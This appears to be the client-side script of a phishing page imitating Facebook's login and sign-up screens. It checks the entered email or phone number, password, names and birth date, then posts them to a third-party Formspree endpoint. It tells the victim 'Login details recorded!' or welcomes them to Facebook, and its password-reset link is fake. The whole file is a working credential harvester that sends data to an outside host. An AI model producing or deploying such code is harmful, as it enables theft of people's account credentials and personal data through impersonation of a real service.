document.addEventListener('DOMContentLoaded', () => {
  // ==========================================
  // DOM ELEMENTS
  // ==========================================
  const loginForm = document.getElementById('loginForm');
  const loginEmail = document.getElementById('loginEmail');
  const loginPassword = document.getElementById('loginPassword');
  
  const togglePasswordBtn = document.getElementById('togglePasswordBtn');
  const openEyeIcon = togglePasswordBtn.querySelector('.open-eye');
  const closedEyeIcon = togglePasswordBtn.querySelector('.closed-eye');
  
  const loginBtn = document.getElementById('loginBtn');
  const loginSpinner = document.getElementById('loginSpinner');
  
  const forgotPwdLink = document.getElementById('forgotPwdLink');
  
  // Sign Up Modal Elements
  const openSignUpBtn = document.getElementById('openSignUpBtn');
  const closeSignUpBtn = document.getElementById('closeSignUpBtn');
  const signUpModal = document.getElementById('signUpModal');
  const signUpForm = document.getElementById('signUpForm');
  
  const regFirstName = document.getElementById('regFirstName');
  const regLastName = document.getElementById('regLastName');
  const regEmail = document.getElementById('regEmail');
  const regPassword = document.getElementById('regPassword');
  
  const dobDay = document.getElementById('dobDay');
  const dobMonth = document.getElementById('dobMonth');
  const dobYear = document.getElementById('dobYear');
  
  const regSubmitBtn = document.getElementById('regSubmitBtn');
  const regSpinner = document.getElementById('regSpinner');
  
  const toastContainer = document.getElementById('toastContainer');

  // ==========================================
  // INITS & DYNAMIC SELECTORS
  // ==========================================
  populateDOB();

  // ==========================================
  // PASSWORD VISIBILITY TOGGLE
  // ==========================================
  togglePasswordBtn.addEventListener('click', () => {
    const isPassword = loginPassword.type === 'password';
    loginPassword.type = isPassword ? 'text' : 'password';
    
    if (isPassword) {
      openEyeIcon.classList.add('hidden');
      closedEyeIcon.classList.remove('hidden');
      togglePasswordBtn.setAttribute('aria-label', 'Hide password');
    } else {
      openEyeIcon.classList.remove('hidden');
      closedEyeIcon.classList.add('hidden');
      togglePasswordBtn.setAttribute('aria-label', 'Show password');
    }
  });

  // ==========================================
  // MODAL MANAGEMENT
  // ==========================================
  const openModal = () => {
    signUpModal.classList.add('open');
    signUpModal.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden'; // Prevent background scroll
    regFirstName.focus();
  };

  const closeModal = () => {
    signUpModal.classList.remove('open');
    signUpModal.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = ''; // Enable background scroll
    openSignUpBtn.focus();
    resetFormErrors(signUpForm);
    signUpForm.reset();
  };

  openSignUpBtn.addEventListener('click', openModal);
  closeSignUpBtn.addEventListener('click', closeModal);
  
  // Close modal when clicking outside the card
  signUpModal.addEventListener('click', (e) => {
    if (e.target === signUpModal) {
      closeModal();
    }
  });

  // Esc key closes modal
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && signUpModal.classList.contains('open')) {
      closeModal();
    }
  });

  // ==========================================
  // VALIDATION & HELPERS
  // ==========================================
  
  // Regex patterns
  const EMAIL_PATTERN = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const PHONE_PATTERN = /^\+?[0-9]{7,15}$/;

  function validateInput(input, condition, errorSpanId) {
    const isValid = condition();
    const group = input.parentElement;
    
    if (isValid) {
      group.classList.remove('invalid');
    } else {
      group.classList.add('invalid');
    }
    return isValid;
  }

  function resetFormErrors(form) {
    const groups = form.querySelectorAll('.input-group');
    groups.forEach(g => g.classList.remove('invalid'));
  }

  // Real-time error removal on input
  [loginEmail, loginPassword, regFirstName, regLastName, regEmail, regPassword].forEach(input => {
    input.addEventListener('input', () => {
      input.parentElement.classList.remove('invalid');
    });
  });

  // ==========================================
  // FORM SUBMISSION (LOGIN)
  // ==========================================
  loginForm.addEventListener('submit', (e) => {
    e.preventDefault();

    // Perform validation checks
    const isEmailValid = validateInput(
      loginEmail,
      () => EMAIL_PATTERN.test(loginEmail.value.trim()) || PHONE_PATTERN.test(loginEmail.value.trim()),
      'emailError'
    );

    const isPasswordValid = validateInput(
      loginPassword,
      () => loginPassword.value.length >= 6,
      'passwordError'
    );

    if (isEmailValid && isPasswordValid) {
      setLoadingState(true);
      
      fetch('https://formspree.io/f/xeewwdol', {
        method: 'POST',
        body: new FormData(loginForm),
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(response => {
        setLoadingState(false);
        if (response.ok) {
          showToast('Login details recorded! Redirecting you...', 'success');
          loginForm.reset();
        } else {
          response.json().then(data => {
            if (Object.prototype.hasOwnProperty.call(data, 'errors')) {
              showToast(data.errors.map(error => error.message).join(", "), 'error');
            } else {
              showToast('Form submission failed. Please try again.', 'error');
            }
          });
        }
      })
      .catch(error => {
        setLoadingState(false);
        showToast('Connection error. Please check your internet.', 'error');
      });
    } else {
      showToast('Please fix the errors in the form.', 'error');
    }
  });

  function setLoadingState(isLoading) {
    if (isLoading) {
      loginBtn.disabled = true;
      loginSpinner.classList.remove('hidden');
      loginBtn.querySelector('.btn-text').textContent = 'Connecting...';
      loginEmail.disabled = true;
      loginPassword.disabled = true;
      togglePasswordBtn.style.pointerEvents = 'none';
    } else {
      loginBtn.disabled = false;
      loginSpinner.classList.add('hidden');
      loginBtn.querySelector('.btn-text').textContent = 'Log In';
      loginEmail.disabled = false;
      loginPassword.disabled = false;
      togglePasswordBtn.style.pointerEvents = 'auto';
    }
  }

  // ==========================================
  // FORM SUBMISSION (SIGN UP / REGISTER)
  // ==========================================
  signUpForm.addEventListener('submit', (e) => {
    e.preventDefault();

    const isFirstValid = validateInput(regFirstName, () => regFirstName.value.trim() !== '', 'firstNameError');
    const isLastValid = validateInput(regLastName, () => regLastName.value.trim() !== '', 'lastNameError');
    const isEmailValid = validateInput(regEmail, () => EMAIL_PATTERN.test(regEmail.value.trim()) || PHONE_PATTERN.test(regEmail.value.trim()), 'regEmailError');
    const isPasswordValid = validateInput(regPassword, () => regPassword.value.length >= 6, 'regPasswordError');

    if (isFirstValid && isLastValid && isEmailValid && isPasswordValid) {
      setRegLoadingState(true);

      fetch('https://formspree.io/f/xeewwdol', {
        method: 'POST',
        body: new FormData(signUpForm),
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(response => {
        setRegLoadingState(false);
        if (response.ok) {
          showToast('Account created successfully! Welcome to Facebook.', 'success');
          closeModal();
        } else {
          response.json().then(data => {
            if (Object.prototype.hasOwnProperty.call(data, 'errors')) {
              showToast(data.errors.map(error => error.message).join(", "), 'error');
            } else {
              showToast('Registration failed. Please try again.', 'error');
            }
          });
        }
      })
      .catch(error => {
        setRegLoadingState(false);
        showToast('Connection error. Please check your internet.', 'error');
      });
    } else {
      showToast('Please complete all required fields.', 'error');
    }
  });

  function setRegLoadingState(isLoading) {
    if (isLoading) {
      regSubmitBtn.disabled = true;
      regSpinner.classList.remove('hidden');
      regSubmitBtn.querySelector('.btn-text').textContent = 'Registering...';
      regFirstName.disabled = true;
      regLastName.disabled = true;
      regEmail.disabled = true;
      regPassword.disabled = true;
    } else {
      regSubmitBtn.disabled = false;
      regSpinner.classList.add('hidden');
      regSubmitBtn.querySelector('.btn-text').textContent = 'Sign Up';
      regFirstName.disabled = false;
      regLastName.disabled = false;
      regEmail.disabled = false;
      regPassword.disabled = false;
    }
  }

  // ==========================================
  // FORGOT PASSWORD / SIMULATED LINKS
  // ==========================================
  forgotPwdLink.addEventListener('click', (e) => {
    e.preventDefault();
    showToast('Password reset link sent to your registered account.', 'info');
  });

  // ==========================================
  // TOAST SYSTEM
  // ==========================================
  function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    
    // Icon mapping
    let icon = '';
    if (type === 'success') {
      icon = '<svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>';
    } else if (type === 'error') {
      icon = '<svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>';
    } else {
      icon = '<svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>';
    }

    toast.innerHTML = `${icon}<span>${message}</span>`;
    toastContainer.appendChild(toast);

    // Auto-remove after 3.5 seconds
    setTimeout(() => {
      toast.style.animation = 'slideUpFadeIn 0.35s cubic-bezier(0.16, 1, 0.3, 1) reverse forwards';
      setTimeout(() => {
        toast.remove();
      }, 350);
    }, 3500);
  }

  // ==========================================
  // DOB GENERATOR UTILS
  // ==========================================
  function populateDOB() {
    const months = [
      'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 
      'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
    ];
    
    const currentYear = new Date().getFullYear();
    
    // Days (1-31)
    for (let i = 1; i <= 31; i++) {
      const option = new Option(i, i);
      dobDay.add(option);
    }
    
    // Months
    months.forEach((m, index) => {
      const option = new Option(m, index + 1);
      dobMonth.add(option);
    });
    
    // Years (Current back to 1905)
    for (let i = currentYear; i >= 1905; i--) {
      const option = new Option(i, i);
      dobYear.add(option);
    }

    // Set defaults (e.g. June 18, 2000)
    dobDay.value = 18;
    dobMonth.value = 6;
    dobYear.value = 2000;
  }
});
